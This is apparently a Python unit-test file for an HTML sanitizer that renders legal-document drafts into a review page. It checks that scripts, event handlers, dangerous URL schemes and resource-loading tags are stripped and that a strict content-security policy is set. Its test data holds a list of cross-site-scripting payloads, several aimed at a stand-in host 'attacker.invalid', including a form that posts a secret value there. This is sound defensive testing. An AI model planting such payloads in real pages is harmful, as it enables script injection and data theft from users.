"""Exercise the rendered output and its HTML structure, with no network/model calls."""
import html.parser
import pathlib
import sys
import tempfile
import unittest
from urllib.parse import urlsplit

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
from build_pack import CONTENT_TAGS, INLINE_TAGS, Pack, build_page, inline, to_html  # noqa: E402


class ParsedHTML(html.parser.HTMLParser):
    def __init__(self, text):
        super().__init__(convert_charrefs=True)
        self.elements = []
        self.text = []
        self.feed(text)

    def handle_starttag(self, tag, attrs):
        self.elements.append((tag, dict(attrs)))

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)

    def handle_data(self, data):
        self.text.append(data)


class HTMLSafetyTests(unittest.TestCase):
    def assert_inert(self, rendered, allowed_tags):
        parsed = ParsedHTML(rendered)
        for tag, attrs in parsed.elements:
            self.assertIn(tag, allowed_tags, f"Unexpected element in {rendered}")
            for name in attrs:
                self.assertFalse(name.lower().startswith("on"), f"Event attribute in {rendered}")
                self.assertNotIn(name, ("src", "srcdoc", "action", "formaction", "xlink:href"))
            if "href" in attrs:
                value = "".join(c for c in attrs["href"] if ord(c) > 32)
                self.assertIn(urlsplit(value).scheme.lower(), ("", "http", "https", "mailto", "tel"))
                self.assertEqual(attrs.get("rel"), "noopener noreferrer")
        return parsed

    def test_script_and_handlers_removed_from_document_and_inline_routes(self):
        payloads = [
            '<script>globalThis.legalPackInjected = true</script>',
            '<ScRiPt src="https://attacker.invalid/payload.js"></ScRiPt>',
            '<img src=x onerror="globalThis.legalPackInjected = true">',
            '<p onclick="globalThis.legalPackInjected = true">Visible prose</p>',
            '<svg onload="globalThis.legalPackInjected = true"><script>attack()</script></svg>',
            '<iframe srcdoc="<script>attack()</script>" src="https://attacker.invalid"></iframe>',
            '<object data="https://attacker.invalid"><embed src="https://attacker.invalid"></object>',
            '<form action="https://attacker.invalid"><input name="private" value="secret"></form>',
            '<meta http-equiv="refresh" content="0;url=https://attacker.invalid">',
            '<link rel="stylesheet" href="https://attacker.invalid/style.css">',
            '<style>@import url(https://attacker.invalid);body{display:none}</style>',
            '<base href="https://attacker.invalid/">',
            '</div></section><script>attack()</script><p onmouseover="attack()">Visible prose</p>',
            '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=attack()>">',
        ]
        for payload in payloads:
            with self.subTest(payload=payload):
                self.assert_inert(to_html("test", payload), CONTENT_TAGS)
                self.assert_inert(inline(payload), INLINE_TAGS)

    def test_dangerous_link_schemes_and_encoded_payloads_are_removed(self):
        urls = ["javascript:alert(1)", "JaVaScRiPt:alert(1)", "jav&#x61;script:alert(1)",
                "java&#x0a;script:alert(1)", "java&#13;script:alert(1)", "vbscript:msgbox(1)",
                "data:text/html,%3Cscript%3Eattack()%3C/script%3E", "file:///private/contract.txt"]
        for uri in urls:
            with self.subTest(uri=uri):
                rendered = to_html("test", f'<a href="{uri}" onclick="attack()">Link label</a>')
                parsed = self.assert_inert(rendered, CONTENT_TAGS)
                self.assertTrue(any(tag == "a" for tag, _ in parsed.elements))
                self.assertTrue(all("href" not in attrs for tag, attrs in parsed.elements if tag == "a"))
                self.assertIn("Link label", "".join(parsed.text))

    def test_markdown_javascript_links_are_removed(self):
        for renderer in (lambda text: to_html("test", text), inline):
            rendered = renderer("[Click](javascript:alert%281%29)")
            parsed = self.assert_inert(rendered, CONTENT_TAGS)
            self.assertTrue(all("href" not in attrs for tag, attrs in parsed.elements if tag == "a"))

    def test_marker_highlighting_cannot_reopen_sanitized_attributes(self):
        # Highlighting must run before the final sanitizer: marker text can occur in an attribute.
        text = '<a href="https://example.invalid/[OWNER: confirm]" title="[COUNSEL: review]">Source</a>'
        self.assert_inert(to_html("test", text), CONTENT_TAGS)
        self.assert_inert(inline(text), INLINE_TAGS)

    def test_inline_block_elements_cannot_break_generated_paragraphs(self):
        rendered = inline('<div><h1>Title</h1><p>**bold** and prose</p></div>')
        self.assert_inert(rendered, INLINE_TAGS)
        self.assertNotIn("<p", rendered)
        self.assertNotIn("<div", rendered)
        self.assertIn("Title", rendered)

    def test_semantic_markdown_links_tables_code_and_markers_are_preserved(self):
        text = ("# Document\n\n## Section\n\n**bold** and *emphasis*, [source](https://example.invalid), "
                "[email](mailto:owner@example.invalid), and [OWNER: confirm].\n\n"
                "> Quoted source\n\n- First item\n- Second item\n\n"
                "| Name | Finding |\n|:---|---:|\n| Source | Evidence |\n\n"
                "```html\n<script>This is a literal code example</script>\n```\n")
        rendered = to_html("doc", text)
        parsed = self.assert_inert(rendered, CONTENT_TAGS)
        tags = {tag for tag, _ in parsed.elements}
        self.assertTrue({"h3", "strong", "em", "a", "blockquote", "ul", "li", "table", "th", "td", "pre", "code", "mark"} <= tags)
        self.assertIn('id="doc-section"', rendered)
        self.assertIn('class="table-wrap"', rendered)
        self.assertIn('class="mk mk-owner"', rendered)
        self.assertIn('style="text-align:right"', rendered)
        self.assertIn("&lt;script&gt;This is a literal code example&lt;/script&gt;", rendered)

    def test_untrusted_styles_and_classes_cannot_hide_controls_or_fetch_resources(self):
        rendered = to_html("test", '<div class="nav doc table-wrap" style="position:fixed">Text</div>'
                           '<table><tr><td style="background:url(https://attacker.invalid);text-align:right">Cell</td></tr></table>')
        self.assert_inert(rendered, CONTENT_TAGS)
        self.assertNotIn("position", rendered)
        self.assertNotIn("attacker.invalid", rendered)
        self.assertNotIn('class="nav', rendered)
        self.assertIn('style="text-align:right"', rendered)

    def test_generated_page_sanitizes_private_drafts_and_all_markdown_metadata(self):
        with tempfile.TemporaryDirectory(prefix="legal-html-tests-") as folder:
            root = pathlib.Path(folder)
            (root / "drafts").mkdir()
            (root / "drafts/terms-of-service.md").write_text(
                '# Terms\n\nPrivate contract excerpt.\n\n<script>attack()</script>\n'
                '<img src="https://attacker.invalid/pixel" onerror="attack()">\n', encoding="utf-8")
            cfg = {"lede": '<script>attack()</script>Visible lede <a href="javascript:attack()">link</a>',
                   "meta": [["Evidence", '<svg onload="attack()"></svg>Visible metadata']],
                   "hub_url": "javascript:attack%28%29", "hub_label": "Tracker"}
            build_page(Pack(root, cfg))
            rendered = (root / "review.html").read_text(encoding="utf-8")
            parsed = ParsedHTML(rendered)
            tags = {tag for tag, _ in parsed.elements}
            self.assertFalse({"script", "img", "svg", "iframe", "object", "embed", "form", "input", "link", "base"} & tags)
            for tag, attrs in parsed.elements:
                self.assertFalse(any(key.startswith("on") for key in attrs))
                self.assertFalse("javascript:" in attrs.get("href", "").lower())
            policies = [attrs.get("content", "") for tag, attrs in parsed.elements
                        if tag == "meta" and attrs.get("http-equiv") == "Content-Security-Policy"]
            self.assertEqual(len(policies), 1)
            for directive in ("default-src 'none'", "script-src 'none'", "connect-src 'none'",
                              "object-src 'none'", "frame-src 'none'", "form-action 'none'"):
                self.assertIn(directive, policies[0])
            self.assertTrue(any(tag == "meta" and attrs.get("name") == "referrer" and
                                attrs.get("content") == "no-referrer" for tag, attrs in parsed.elements))
            self.assertEqual(sum(tag == "style" for tag, _ in parsed.elements), 1)
            self.assertIn('aria-label="Documents"', rendered)
            self.assertIn('href="#terms-of-service"', rendered)
            self.assertIn('href="#top"', rendered)
            self.assertIn("Private contract excerpt", rendered)
            self.assertIn("Visible lede", rendered)
            self.assertIn("Visible metadata", rendered)
            self.assertNotIn("fonts.googleapis.com", rendered)


if __name__ == "__main__":
    unittest.main()
